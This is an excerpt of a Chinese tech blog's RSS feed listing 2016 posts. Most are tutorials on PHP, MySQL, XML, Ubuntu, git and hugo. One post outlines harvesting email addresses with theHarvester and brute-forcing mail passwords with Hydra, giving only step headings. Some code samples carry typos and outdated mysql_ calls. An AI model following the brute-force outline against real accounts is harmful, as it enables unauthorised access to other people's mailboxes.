#7B68EE  #7AC5CD  #7A8B8B  #7A7A7A    #7A67EE  #7A378B  #79CDCD  #787878    #778899  #76EEC6  #76EE00  #757575    #737373  #71C671  #7171C6  #708090    #707070  #6E8B3D  #6E7B8B  #6E6E6E    #6CA6CD  #6C7B8B  #6B8E23  #6B6B6B    #6A5ACD  #698B69  #698B22  #696969    #6959CD  #68838B  #68228B  #66CDAA    #66CD00  #668B8B  #666666  #6495ED    #63B8FF  #636363  #616161  #607B8B    #5F9EA0  #5E5E5E  #5D478B  #5CACEE    #5C5C5C  #5B5B5B  #595959  #575757    #556B2F  #555555  #551A8B  #54FF9F    #548B54  #545454  #53868B  #528B8B    #525252  #515151  #4F94CD  #4F4F4F    #4EEE94  #4D4D4D  #4B0082  #4A708B    #4A4A4A  #48D1CC  #4876FF  #483D8B    #474747  #473C8B  #4682B4  #458B74    #458B00  #454545  #43CD80  #436EEE    #424242  #4169E1  #40E0D0  #404040    #3D3D3D  #3CB371  #3B3B3B  #3A5FCD    #388E8E  #383838  #36648B  #363636    #333333  #32CD32  #303030  #2F4F4F    #2E8B57  #2E2E2E  #2B2B2B  #292929    #282828  #27408B  #262626  #242424    #228B22  #218868  #212121  #20B2AA    #1F1F1F  #1E90FF  #1E1E1E  #1C86EE    #1C1C1C  #1A1A1A  #191970  #1874CD    #171717  #141414  #121212  #104E8B    #0F0F0F  #0D0D0D  #0A0A0A  #080808    #050505  #030303  #00FFFF  #00FF7F    #00FF00  #00FA9A  #00F5FF  #00EEEE    #00EE76  #00EE00  #00E5EE  #00CED1    #00CDCD  #00CD66  #00CD00  #00C5CD    #00BFFF  #00B2EE  #009ACD  #008B8B    #008B45  #008B00  #00868B  #00688B    #006400  #0000FF  #0000EE  #0000CD    #0000AA  #00008B  #000080  #000000</description>
    </item>
    
    <item>
      <title>PHP之封装MySQL类</title>
      <link>http://wyb0.com/posts/2016/php-package-mysql-function/</link>
      <pubDate>Fri, 03 Jun 2016 11:19:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/php-package-mysql-function/</guid>
      <description>0x00 config.inc.php内容如下 &amp;lt;?php return array( &#39;DB_HOST&#39; =&amp;gt; &#39;192.168.188.134&#39;, &#39;DB_NAME&#39; =&amp;gt; &#39;scoreboard&#39;, &#39;DB_USER&#39; =&amp;gt; &#39;score&#39;, &#39;DB_PASS&#39; =&amp;gt; &#39;123456&#39;, &#39;DB_CHARSET&#39; =&amp;gt; &#39;utf8&#39;, &#39;IS_LOG&#39; =&amp;gt; 1,//开启日志 &#39;LOGFILEPATH&#39; =&amp;gt; &#39;../log.txt&#39;//日志路径 ); /* $database = require(&#39;./config.php&#39;); echo $database[&#39;DB_TYPE&#39;]; //输出&#39;DB_TYPE&#39; */ ?&amp;gt;  0x01 表设计如下 create database scoreboard; use scoreboard; drop table if exists users; create table users( id int not null auto_increment primary key, gid int not null default &#39;xiaoming&#39; comment &#39;组id&#39;, username varchar(20) not null default &#39;xiaoming&#39; comment &#39;用户名&#39;, password varchar(32) not null default &#39;123456&#39; comment &#39;密码&#39;, sex varchar(2) not null default &#39;0&#39; comment &#39;性别&#39;, totalscore int not null default &#39;0&#39; comment &#39;个人总积分&#39; ); drop table if exists share; create table share( id int not null auto_increment primary key, uid int not null, content varchar(1024) not null default &#39;content&#39; comment &#39;分享内容&#39;, comment varchar(1024) comment &#39;点评&#39;, date varchar(15) not null default &#39;20150101&#39; comment &#39;分享日期&#39; ); drop table if exists score; create table score( id int not null auto_increment primary key, uid int not null default &#39;0&#39; comment &#39;用户id&#39;, score int not null default &#39;0&#39; comment &#39;用户单次积分&#39;, ); grant all privileges on scoreboard.</description>
    </item>
    
    <item>
      <title>PHP之MySQL常用函数</title>
      <link>http://wyb0.com/posts/2016/php-mysql-common-function/</link>
      <pubDate>Thu, 02 Jun 2016 13:21:49 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/php-mysql-common-function/</guid>
      <description>0x00 处理函数  mysql_connect(server,user,pwd,newlink,clientflag)
连接服务器的函数,成功则返回MySQL标识，失败则返回FALSE
 mysql_select_db(database,connection)
选择数据库的函数，成功则返回true，失败则返回false
 mysql_query(query,connection)
执行一条查询，返回一个资源标识符(结果集)，如果查询执行不正确则返回FALSE
 mysql_num_rows(data)和mysql_num_fields(data)
函数分别返回结果集中行和列的数目(禁对SELECT语句有效),结果集从 mysql_query()的调用中得到
 mysql_fetch_assoc(data)
从结果集中取得一行作为关联数组，若没有更多行则返回false
 mysql_fetch_row(data)
从结果集中取得一行作为索引数组，若没有更多行则返回false
 mysql_error(connection)
返回上一个MySQL函数的错误文本，如果没有出错则返回&amp;rdquo;(空字符串)
 mysql_affected_rows(link_identifier)
返回前一次MySQL操作(增删改)所影响的记录行数,失败则返回-1
 mysql_insert_id(connection)
返回上一步INSERT操作产生的 ID。如果上一查询没有产生AUTO_INCREMENT的ID，则mysql_insert_id()返回 0。
 mysql_data_seek(data,row)
结果集data从mysql_query()的调用中得到,行指针移动到指定的行号，接着调用 mysql_fetch_row() 将返回那一行。如果成功则返回 true，失败则返回 false
  0x01 例子 &amp;lt;?php $server = &amp;quot;127.0.0.1&amp;quot;; $dbname = &amp;quot;massage&amp;quot;; $user = &amp;quot;msg&amp;quot;; $pass = &amp;quot;123456&amp;quot; $conn = mysql_connect($server,$user,$pass) or die(&#39;连接服务器失败:&#39;.mysql_error()); mysql_query(&amp;quot;set names &#39;utf8&#39;&amp;quot;);//设置数据库输出编码 mysql_select_db($dbname,$conn) or die(mysql_error($conn)); //选择数据库 $sql = &amp;quot;select username,password from user&amp;quot;; //构造sql语句 $result = mysql_query($sql); //执行sql语句，返回结果集 $num = mysql_num_rows($result);//返回执行结果的行数 echo &amp;quot;&amp;lt;br /&amp;gt;结果的行数:{$num}&amp;lt;br /&amp;gt;&amp;quot;; while ($row = mysql_fetch_assoc($result)) { echo $row[id].</description>
    </item>
    
    <item>
      <title>MySQL语法</title>
      <link>http://wyb0.com/posts/2016/mysql-syntax/</link>
      <pubDate>Thu, 02 Jun 2016 11:19:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/mysql-syntax/</guid>
      <description>0x00 Select语句的一般语法 1.SELECT [ALL|DISTINCT] &amp;lt;目标列表达式&amp;gt; [,&amp;lt;目标列表达式&amp;gt; ]... 2.FROM &amp;lt;表名或视图名&amp;gt; [,&amp;lt;表名或视图名&amp;gt; ]... 3.[ WHERE &amp;lt;行条件表达式&amp;gt; ] 4.[ GROUP BY &amp;lt;列名1&amp;gt; ,[列名2][,...][HAVING组条件表达式] ] 5.[ ORDER BY &amp;lt;列名1&amp;gt; ,[ASC|DESC][,...] ];  上面5个句子书写时按顺序，尽量一个句子一行，但在机器内部执行时的顺序是2-3-4-1-5，
即先确定从哪个数据源查找，
然后确定过滤条件，
若有分组则对过滤后的记录进行分组，若分组有限制条件则对分组进一步限制，
然后将符合条件的列查询出来，
最后对结果进行排序。
select name as &#39;名字&#39;,password as &#39;密码&#39; form user; select * from message where id between 2 and 6; select * from message where title like &#39;%留言_&#39;; //%匹配任意个字符,_匹配一个字符 select * from message where uid in (2,3,4); //删除2、3、4共3条数据  0x01 连接查询 [&amp;lt;表名1&amp;gt;.</description>
    </item>
    
    <item>
      <title>win/ubuntu双系统分区设置</title>
      <link>http://wyb0.com/posts/2016/win-and-ubuntu-partition/</link>
      <pubDate>Tue, 31 May 2016 23:35:06 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/win-and-ubuntu-partition/</guid>
      <description> win10和ubuntu双系统分区设置  硬盘采用uefi格式 硬盘首部留400M空间，是FAT16的格式，用来存放win的引导信息 在硬盘末尾给ubuntu划分50G左右空间 ubuntu的/分区，格式为ext4，空间为40G ubuntu的/home分区，格式为ext4，空间为10G ubuntu的/boot分区，格式为ext4,空间为200M ubuntu的/swap分区，格式为swap，空间为200M ubuntu的引导分区为/boot  </description>
    </item>
    
    <item>
      <title>MySQL的增删改查</title>
      <link>http://wyb0.com/posts/2016/mysql-curd/</link>
      <pubDate>Sun, 29 May 2016 22:50:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/mysql-curd/</guid>
      <description>0x00 连接数据库 0x01 查看数据库 0x02 创建数据库 一般将sql语句保存在文本中，然后复制运行
create database test; use test; drop table if exists users; create table users( id int not null auto_increment primary key, username varchar(20) not null default &#39;xiaoming&#39; comment &#39;用户名&#39;, password varchar(32) not null default &#39;123456&#39; comment &#39;密码&#39; ); drop table if exists msg; create table msg( id int not null auto_increment primary key, uid int not null default &#39;0&#39; comment &#39;用户id&#39;, title varchar(30) not null default &#39;title&#39; comment &#39;信息标题&#39;, content varchar(1024) not null default &#39;content&#39; comment &#39;信息内容&#39;, ip varchar(15) not null default &#39;127.</description>
    </item>
    
    <item>
      <title>XML基础</title>
      <link>http://wyb0.com/posts/2016/xml-basis/</link>
      <pubDate>Wed, 25 May 2016 13:59:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/xml-basis/</guid>
      <description>0x00 XML简介 1、xml的设计宗旨是传输数据，而并非显示数据
2、xms是不作为的，它被设计用来结构化、存储以及传输信息
3、xml只是纯文本，独立于软硬件和应用程序
4、xml可供任何软硬设备读取数据
5、xml可以自定义标签
6、xml具有自我描述性
7、xml是对html的补充
8、xml常用于简化数据的存储和共享
0x01 XML语法规则 1、所有元素必有闭合标签
2、标签对大小写敏感
3、必须正确的嵌套
4、XML必须有根元素，根节点可以有子节点
5、XML的属性值必须加引号(能用子元素的就用子元素代替属性)
6、空格会被保留
7、XML以LF存储换行
8、注释使用&amp;lt;!-- --&amp;gt;
9、实体引用
&amp;amp;lt; &amp;lt; 小于 &amp;amp;gt; &amp;gt; 大于 &amp;amp;amp; &amp;amp; 和号 &amp;amp;apos; &#39; 单引号 &amp;amp;quot; &amp;quot; 引号  0x02 XML格式 &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &amp;lt;!--xml声明--&amp;gt; &amp;lt;!--文档类型定义--&amp;gt; &amp;lt;!DOCTYPE note [ &amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt; &amp;lt;!ELEMENT to (#PCDATA)&amp;gt; &amp;lt;!-- 定义to标签中元素的类型　--&amp;gt; &amp;lt;!ELEMENT from (#PCDATA)&amp;gt; &amp;lt;!ELEMENT heading (#PCDATA)&amp;gt; &amp;lt;!ELEMENT body (#PCDATA)&amp;gt; ]&amp;gt; &amp;lt;!--文档元素--&amp;gt; &amp;lt;note&amp;gt; &amp;lt;to&amp;gt;Tom&amp;lt;/to&amp;gt; &amp;lt;from&amp;gt;John&amp;lt;/from&amp;gt; &amp;lt;heading&amp;gt;Reminder&amp;lt;/heading&amp;gt; &amp;lt;body&amp;gt;Hi,I’am John&amp;lt;/body&amp;gt; &amp;lt;/note&amp;gt;  0x03 XML示例 例子一：John给George的便签</description>
    </item>
    
    <item>
      <title>PHP之上传与下载</title>
      <link>http://wyb0.com/posts/2016/php-upload-and-download/</link>
      <pubDate>Tue, 24 May 2016 08:31:09 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/php-upload-and-download/</guid>
      <description>0x00 上传  客户端设置
客户端使用form表单上传文件，在form表单中必须指明enctype和method属性的值
&amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;post&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&amp;quot;xx.php&amp;quot; mothod=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt; &amp;lt;input type=&amp;quot;file&amp;quot; value=&amp;quot;myfile&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt; &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot; /&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  服务端设置
 php.ini:
file_uploads = On //默认允许HTTP文件上传，此选项不能设置为OFF upload_tmp_dir= //文件上传时存放文件的临时目录 upload_max_filesize = 20M //设定单个文件上传的大小，必须小于post_max_size post_max_size = 19M //允许POST表单的数据最大大小  $_FILES:
$_FILES[&#39;upload_file&#39;][&#39;name&#39;] //带扩展名的原始文件名 $_FILES[&#39;upload_file&#39;][&#39;size&#39;] //文件大小 $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;] //临时文件名 $_FILES[&#39;upload_file&#39;][&#39;error&#39;] //上传文件时的错误信息 $_FILES[&#39;upload_file&#39;][&#39;type&#39;] //上传文件的类型 //type是上传文件时原始信息里的content_type,即MIME,有image/gig、text/html等 //error一般有5中类型： //0 上传成功 //1 文件大小超过了upload_max_filesize //2 文件大小超过了表单总MAX_FILE_SIZE设定的值 //3 只有部分被上传 //4 没有上传任何文件  服务端上传步骤</description>
    </item>
    
    <item>
      <title>PHP之目录与文件</title>
      <link>http://wyb0.com/posts/2016/php-directory-and-file/</link>
      <pubDate>Sun, 22 May 2016 16:29:47 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/php-directory-and-file/</guid>
      <description>0x00 目录的操作 &amp;lt;?php $path = &amp;quot;/var/www/html/php/dir.php&amp;quot;; echo dirname($path).&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; //返回上级路径 echo basename($path).&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; //返回文件名部分 print_r(pathinfo($path)); //返回包含path信息的数组 echo &amp;quot;&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;&amp;quot;; //readdir()从目录句柄读取条目，返回目录中的文件名，指针依次向后移动 $path = &amp;quot;D:/phpStudy/WWW/php&amp;quot;; $dh = opendir($path); while (false !== ($filename=readdir($dh))) { echo $filename.&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; } rewinddir($dh); //指针复位 echo readdir($dh); closedir($dh); mkdir(&amp;quot;./aaa&amp;quot;);//创建文件夹aaa rmdir(&amp;quot;./aaa&amp;quot;);//删除文件夹aaa file_put_contents(&amp;quot;aa.php&amp;quot;, &amp;quot;&amp;quot;);//创建文件aa.php unlink(&amp;quot;./aa.php&amp;quot;);//删除文件aa.php ?&amp;gt;   
0x01 文件的读写  fopen(filename,mode)和fclose(filename,mode) 例子： &amp;lt;?php $file = fopen(&amp;quot;test.txt&amp;quot;,&amp;quot;r&amp;quot;); $file = fopen(&amp;quot;/home/test/test.txt&amp;quot;,&amp;quot;r&amp;quot;); $file = fopen(&amp;quot;/home/test/test.gif&amp;quot;,&amp;quot;wb&amp;quot;); $file = fopen(&amp;quot;http://www.example.com/&amp;quot;,&amp;quot;r&amp;quot;); $file = fopen(&amp;quot;ftp://user:password@example.</description>
    </item>
    
    <item>
      <title>PHP之字符串</title>
      <link>http://wyb0.com/posts/2016/php-string/</link>
      <pubDate>Sat, 21 May 2016 23:16:28 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/php-string/</guid>
      <description>0x00 特点  字符串可以使用数组的处理函数操作，但并不是真正的数组 双引号中的变量用{}括起来，因为字符串中若遇到$符号，解析器会尽可能多的获取后面的字符以组成一个合法的变量名
&amp;lt;?php $lamp = array(&#39;os&#39; =&amp;gt; &#39;Linux&#39;, &#39;webserver&#39; =&amp;gt; &#39;Apache&#39;, &#39;db&#39; =&amp;gt; &#39;Mysql&#39;, &#39;language&#39; =&amp;gt; &#39;PHP&#39;); echo &amp;quot;A OS is $lamp[os].&amp;quot;; // ok echo &amp;quot;A OS is $lamp[&#39;os&#39;].&amp;quot;; // false echo &amp;quot;A OS is {$lamp[&#39;os&#39;]}.&amp;quot;; //ok echo &amp;quot;A OS is {$lamp[os]}.&amp;quot;; // ok echo &amp;quot;This square is $square-&amp;gt;width meters broad.&amp;quot;; //ok echo &amp;quot;This square is $square-&amp;gt;width meters broad.&amp;quot;; //ok echo &amp;quot;This square is $square-&amp;gt;width meters broad.</description>
    </item>
    
    <item>
      <title>PHP之面向对象</title>
      <link>http://wyb0.com/posts/2016/php-object-oriented/</link>
      <pubDate>Fri, 20 May 2016 16:07:55 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/php-object-oriented/</guid>
      <description>0x00 面向对象  面向对象概念  面向对象是达到了软件工程的三个目标：重用性、灵活性和扩展性，使其编程的代码更加简洁、更易于维护、并且具有更强的可重用性。  类和对象的关系  在面向对象的编程语言中，类是一个对立的程序单位，而对象的抽象就是类。类描述了一组有相同特性(属性)和相同行为(方法)的对象。开发时要先抽象类再用该类去创建对象。而我们的程序中直接使用的是对象而不是类。  什么是类  在面向对象的编程语言中，类是一个对立的程序单位，是具有相同属性和服务的一组对象的集合。它为属于该类的所有对象提供了同意的抽象描述，其内部包括成员属性和服务的方法两个部分。  什么是对象  在客观世界里，所有的事物都是由对象和对象之间的联系组成的。对象是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位，一个对象由一组属性和有权对这些属性进行操作的一组服务的封装体。   0x01 类的声明  类名和变量名还有函数名的命名规则类似，都遵循PHP中定义名称的命名规则。 若类名由多个单词组成，习惯上每个单词的首字母要大写 类中成员可分为属性和方法 属性为静态描述，方法为动态描述 在类中声明成员属性时，变量前面一定要有关键字，如：public、private、static等 若不需要有特定意义的修饰，则使用var关键字  格式： [一些修饰类的关键字] class 类名 { 类中成员; } Class Person { 成员属性： 姓名、性别、年龄、身高、体重、电话、住址等 成员方法： 说话、学习、走路、吃饭、开车、使用手机等 } 例子： &amp;lt;?php class Person { var $name; var $age; var $sex; function say() { echo &amp;quot;人在说话&amp;quot;; } function run() { echo &amp;quot;人在走路&amp;quot;; } } ?</description>
    </item>
    
    <item>
      <title>PHP之数组</title>
      <link>http://wyb0.com/posts/2016/php-array/</link>
      <pubDate>Wed, 18 May 2016 11:09:46 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/php-array/</guid>
      <description>0x00 分类  索引数组 索引值从0开始，依次递增 关联数组 以字符串为索引，键和值对是无序组合，每个键都是唯一的  0x01 数组的定义 两种方法：
 直接为数组元素赋值即可声明数组 使用array()函数声明数组
&amp;lt;?php // 1.直接为数组元素赋值即可声明数组 $contact_index[0] = 1; $contact_index[1] = &amp;quot;高某&amp;quot;; $contact_index[2] = &amp;quot;A公司&amp;quot;; $contact_index[3] = &amp;quot;北京市&amp;quot;; $contact_index[] = &amp;quot;gao@a.com&amp;quot;; var_dump($contact_index); $contact_key[&amp;quot;ID&amp;quot;] = &amp;quot;2&amp;quot;; $contact_key[&amp;quot;姓名&amp;quot;] = &amp;quot;峰某&amp;quot;; $contact_key[&amp;quot;公司&amp;quot;] = &amp;quot;B公司&amp;quot;; $contact_key[&amp;quot;邮箱&amp;quot;] = &amp;quot;feng@b.com&amp;quot;; var_dump($contact_key); // 2.使用array()函数声明数组 $contact_key_array = array( &amp;quot;ID&amp;quot; =&amp;gt; 1; &amp;quot;姓名&amp;quot; =&amp;gt; &amp;quot;峰某&amp;quot;; &amp;quot;公司&amp;quot; =&amp;gt; &amp;quot;B公司&amp;quot;; &amp;quot;邮箱&amp;quot; =&amp;gt; &amp;quot;feng@b.com&amp;quot;; ); var_dump($contact_key_array); ?&amp;gt;   0x02 数组的遍历  for语句遍历数组 foreach语句遍历数组</description>
    </item>
    
    <item>
      <title>PHP之基础</title>
      <link>http://wyb0.com/posts/2016/php-basis/</link>
      <pubDate>Sun, 15 May 2016 09:10:23 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/php-basis/</guid>
      <description>0x00 PHP的作用 1. 收集表单数据 2. 生成动态网页 3. 字符串处理 4. 动态输出图片 5. 处理服务器端文件系统 6. 编写数据库支持的网页 7. 会话跟踪控制 8. 处理XML文件 9. 支持大量的网络协议 10. 服务器端的其他相关操作  0x01 PHP代码嵌入位置 可以将PHP语言嵌入到扩展名为.php的HTML文件中的任何位置，只要在文件中使用&amp;quot;&amp;lt;?php&amp;quot;起始符和终止符&amp;quot;?&amp;gt;&amp;quot;就会开启PHP模式，在PHP模式中写入PHP语句即可将PHP语言嵌入到HTML文件中。
0x02 解读开始和结束标记 1. &amp;lt;?php ?&amp;gt; 2. &amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; 3. &amp;lt;? ?&amp;gt; 4. &amp;lt;% %&amp;gt; //前两种总是可用，第3、4种要在php.ini中开启short_open_tag和asp_tags //双引号中的变量可以被解析，单引号中的变量不能被解析  0x03 指令分割符及空白符及注释符  一段代码中除了最后一行其他每句都要用分号结束（推荐每句都用分号结束） 空白符(空格、tab制表符、换行)会被php引擎忽略 注释符  1. 若觉得代码不合适则可以注释，但不要急于删除 2. 注释的目的在于说明程序 3. 注释对调试和编写程序可以起到很好的帮助作用 4. PHP注释符有：&amp;quot;/**/&amp;quot;、&amp;quot;//&amp;quot;、&amp;quot;#&amp;quot;  0x04 运算符 * 算数运算符：&amp;quot;+&amp;quot;、&amp;quot;-&amp;quot;、&amp;quot;*&amp;quot;、&amp;quot;/&amp;quot;、&amp;quot;%&amp;quot; * 赋值运算符：&amp;quot;=&amp;quot;、&amp;quot;+=&amp;quot;、&amp;quot;-=&amp;quot;、&amp;quot;*=&amp;quot;、&amp;quot;/=&amp;quot;、&amp;quot;%=&amp;quot; * 字符串运算符：&amp;quot;.&amp;quot;、&amp;quot;.=&amp;quot; * 递增/递减运算符：&amp;quot;++$a&amp;quot;、&amp;quot;$a++(先赋值再++)&amp;quot;、&amp;quot;--$a&amp;quot;、&amp;quot;$a--&amp;quot; * 比较运算符 * == 等于 * === 全等(完全相同) * !</description>
    </item>
    
    <item>
      <title>使用theHarvester得到邮箱</title>
      <link>http://wyb0.com/posts/2016/theharvester-blasting-email/</link>
      <pubDate>Thu, 12 May 2016 15:27:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/theharvester-blasting-email/</guid>
      <description> 0x00 软件 使用theHarvester搜集邮箱 使用dnsenum得到邮箱服务器域名 使用nmap查看端口开启情况 使用Hydra进行弱口令猜解  0x01 设置Shadowsocks为全局模式: 0x02 得到邮箱 可在theHarvester下载theHarvester，得到邮箱后做成字典user.txt 0x03 得到邮箱服务器域名 0x04 nmap确认端口开启 0x05 Hydra爆密码 0x06 尝试登陆 </description>
    </item>
    
    <item>
      <title>Nessus的安装</title>
      <link>http://wyb0.com/posts/2016/nessus-install/</link>
      <pubDate>Wed, 11 May 2016 17:09:10 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/nessus-install/</guid>
      <description> 0x00 下载Nessus的deb安装包: 去【这里】，选择家庭版，然后下载对应的安装包 0x01 本地安装nessus: 0x02 执行后续安装步骤:  启动nessus  web访问nessus服务  设置账户和密码  申请code，可以在【这里】申请  去邮箱查找code  将code填入，然后等待插件的下载   0x03 登陆Nessus: </description>
    </item>
    
    <item>
      <title>Nmap思维导图</title>
      <link>http://wyb0.com/posts/2016/nmap-mind-mapping/</link>
      <pubDate>Tue, 10 May 2016 20:24:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/nmap-mind-mapping/</guid>
      <description> nmap思维导图如下： </description>
    </item>
    
    <item>
      <title>Windows下向github推送博客</title>
      <link>http://wyb0.com/posts/2016/windows-push-blog-to-github/</link>
      <pubDate>Tue, 10 May 2016 15:22:20 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/windows-push-blog-to-github/</guid>
      <description> 0x00 开启本地服务 0x01 编辑md文档 0x02 推送md文档 0x03 推送html 0x04 查看推送是否成功 </description>
    </item>
    
    <item>
      <title>Windows下用github搭建博客</title>
      <link>http://wyb0.com/posts/2016/windows-build-blog-in-github/</link>
      <pubDate>Tue, 10 May 2016 09:24:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/windows-build-blog-in-github/</guid>
      <description>0x00 首先在github上新建仓库 0x01 本地新建仓库  下载安装hugo  为hugo添加环境变量  下载安装github客户端  新建仓库  下载主题
可以在https://github.com/spf13/hugoThemes 下载你喜欢的主题
 使用主题并查看效果   0x02 本地环境配置  本地生成秘钥  在github保存秘钥  测试公钥是否添加成功  设置本地用户名和邮箱   0x03 配置config.toml # 将reber-9全部替换为你github的账户名，另外你也可以进行一些基本的设置 baseurl = &amp;quot;http://reber-9.github.io&amp;quot; languageCode = &amp;quot;en-us&amp;quot; title = &amp;quot;reber-9&#39;s Blog&amp;quot; theme = &amp;quot;beautifulhugo&amp;quot; pygmentsUseClasses = false #disqusShortname = &amp;quot;XXX&amp;quot; #googleAnalytics = &amp;quot;XXX&amp;quot; [Params] logo = &amp;quot;img/avatar-icon.png&amp;quot; subtitle = &amp;quot;This is my personal blog&amp;quot; [Author] name = &amp;quot;Some Person&amp;quot; email = &amp;quot;123123123@163.</description>
    </item>
    
    <item>
      <title>Ubuntu下向github推送博客</title>
      <link>http://wyb0.com/posts/2016/ubuntu-push-blog-to-github/</link>
      <pubDate>Mon, 09 May 2016 23:33:12 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/ubuntu-push-blog-to-github/</guid>
      <description>环境：Ubuntu14.4
0x00 安装hugo和git 0x01 生成密钥，将密钥添加到github $ cd ~ $ ssh-keygen -t rsa -b 2048 -C &amp;quot;123456@qq.com&amp;quot; $ cd ~/.ssh/ $ cat id_rsa.pub # 将公钥添加到 github  0x02 配置本地用户和邮箱 git config --global user.name &amp;quot;reber-9&amp;quot; git config --global user.email &amp;quot;123456@qq.com&amp;quot;  0x03 验证密钥是否添加成功 ssh -T git@github.com
0x04 克隆远程工程 git clone https://github.com/reber-9/reber-9.com.git
0x05 添加CNAME cd ~/reber-9.com/
echo &amp;ldquo;reber-9.com&amp;rdquo; &amp;gt;&amp;gt; static/CNAME
0x06 更新 更新origin remote的master分支：
git pull origin master
获取服务端的改动：
git fetch
0x07 生成html文档，然后创建分支，进行同步 $ mkdir public $ cd public/ $ git init $ git checkout --orphan gh-pages $ git remote add origin git@github.</description>
    </item>
    
    <item>
      <title>Ubuntu下用github搭建博客</title>
      <link>http://wyb0.com/posts/2016/ubuntu-build-blog-in-github/</link>
      <pubDate>Mon, 09 May 2016 10:12:43 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/ubuntu-build-blog-in-github/</guid>
      <description>环境：ubuntu14.04.4
0x00 安装hugo  在https://github.com/spf13/hugo/releases 下载hugo的deb安装包
 安装hugo
reber@ubuntu:~/Downloads$ sudo dpkg -i hug_015_amd64
 生成站点
  reber@ubuntu:~/Downloads$ cd /home/reber reber@ubuntu:~$ hugo new site reber-9.com #新建站点 #启动站点,访问localhost:1313测试有没有成功 reber@ubuntu:~/reber-9.com$ hugo server -w  0x01 配置github  安装git  reber@ubuntu:~$ sudo apt-get install git reber@ubuntu:~$ git --version #查看版本判断是否安装成功   安装ssh  reber@ubuntu:~/reber-9.com$ sudo apt-get install ssh   备份并创建本地ssh
  reber@ubuntu:~/reber-9.com$ cd /home/reber/.ssh/ reber@ubuntu:~/.ssh$ mkdir ras.bak reber@ubuntu:~/.ssh$ cp id_ras* rsa.</description>
    </item>
    
    <item>
      <title>Ubuntu下安装sublime text 3</title>
      <link>http://wyb0.com/posts/2016/ubuntu-insatll-sublime-text3/</link>
      <pubDate>Sun, 08 May 2016 00:04:42 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/ubuntu-insatll-sublime-text3/</guid>
      <description>环境：ubuntu14.4
0x00 安装  添加Sublime Text 3的仓库
sudo add-apt-repository ppa:webupd8team/sublime-text-3
 更新软件库
sudo apt-get update
 安装Sublime Text 3
sudo apt-get install sublime-text-installer
  0x01 解决不能输入中文的问题  新建sublime_imfix.c(位于～目录)，写入如下内容
#include &amp;lt;gtk/gtkimcontext.h&amp;gt; void gtk_im_context_set_client_window (GtkIMContext *context,GdkWindow *window) { GtkIMContextClass *klass; g_return_if_fail (GTK_IS_IM_CONTEXT (context)); klass = GTK_IM_CONTEXT_GET_CLASS (context); if (klass-&amp;gt;set_client_window) klass-&amp;gt;set_client_window (context, window); g_object_set_data(G_OBJECT(context),&amp;quot;window&amp;quot;,window); if(!GDK_IS_WINDOW (window)) return; int width = gdk_window_get_width(window); int height = gdk_window_get_height(window); if(width != 0 &amp;amp;&amp;amp; height !=0) gtk_im_context_focus_in(context); }  将上一步的代码编译成共享库libsublime-imfix.</description>
    </item>
    
    <item>
      <title>Ubuntu初接触(包括搭建LAMP)</title>
      <link>http://wyb0.com/posts/2016/ubuntu-basis-set/</link>
      <pubDate>Sat, 07 May 2016 21:37:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/ubuntu-basis-set/</guid>
      <description>0x00 环境 我是在虚拟机中安装14.04.4版的Ubuntu 下载Ubuntu14.04.4
0x01 配源或选择最快的更新服务器  选择最快的更新服务器:
System Settings &amp;ndash;&amp;gt; Software &amp;amp; Updates &amp;ndash;&amp;gt; Download from:other &amp;ndash;&amp;gt; Select Best Server &amp;ndash;&amp;gt; Choose Serve &amp;ndash;&amp;gt; Close
 配源:
reber@ubuntu:~$ cp /etc/apt/sources.list /etc/apt/sources.list.bak
reber@ubuntu:~$ vim /etc/apt/sources.list
  中科大源： deb http://debian.ustc.edu.cn/ubuntu/ trusty main restricted universe multiverse deb http://debian.ustc.edu.cn/ubuntu/ trusty-security main restricted universe multiverse deb http://debian.ustc.edu.cn/ubuntu/ trusty-updates main restricted universe multiverse deb http://debian.ustc.edu.cn/ubuntu/ trusty-proposed main restricted universe multiverse deb http://debian.ustc.edu.cn/ubuntu/ trusty-backports main restricted universe multiverse deb-src http://debian.</description>
    </item>
    
    <item>
      <title>Git的用法</title>
      <link>http://wyb0.com/posts/2016/git-usage/</link>
      <pubDate>Thu, 05 May 2016 10:30:32 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/git-usage/</guid>
